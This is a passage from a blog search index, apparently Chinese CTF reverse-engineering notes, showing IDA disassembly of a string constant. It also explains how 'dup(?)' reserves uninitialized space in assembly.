operator">:</span>loc_4010E9↑r<span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402152</span> <span class="token number">34</span> <span class="token number">39</span> <span class="token number">66</span> <span class="token number">36</span> <span class="token number">39</span> <span class="token number">63</span> <span class="token number">33</span> <span class="token number">38</span> <span class="token number">33</span> <span class="token number">39</span><span class="token operator">+</span>a49f69c38395cde db '<span class="token number">49f</span><span class="token number">69</span>c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6' <span class="token punctuation">,</span> <span class="token number">0</span></code></pre></li></ul><h3 id="定义字符串时，用-dup-开辟未初始化的空间"><a href="#定义字符串时，用-dup-开辟未初始化的空间" class="headerlink" title="定义字符串时，用 dup(?) 开辟未初始化的空间"></a>定义字符串时，用 <code>dup(?)</code> 开辟未初始化的空间</h3><p><img src="https://s2.loli.net/2023/03/17/r6BYOSP5G7vDb8A.png" alt="CTF - Reverse_IDA——汇编知识1.png"></p><ul><li><strong><code>str2 db 68h dup(?)</code> 是指开辟一个 68h 长度的空间，且不进行初始化</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> IDA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> REVERSE </tag>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
